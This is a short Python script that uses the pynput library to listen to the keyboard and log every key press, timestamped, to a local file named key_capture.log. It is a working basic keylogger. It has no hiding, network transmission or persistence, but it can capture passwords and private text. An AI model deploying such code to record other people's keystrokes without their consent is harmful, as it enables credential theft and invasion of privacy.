import logging
from pynput import keyboard

# Configure logging
logging.basicConfig(
    filename="key_capture.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s]: %(message)s",
)

def on_key_press(key):
    try:
        char = key.char
        if char == '\x08':  # Ignore Backspace
            return
    except AttributeError:
        char = str(key)

    logging.info(f"Key Pressed: {char}")

def on_key_release(key):
    pass

def main():
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        logging.info("Key capture started.")
        listener.join()

if __name__ == "__main__":
    main()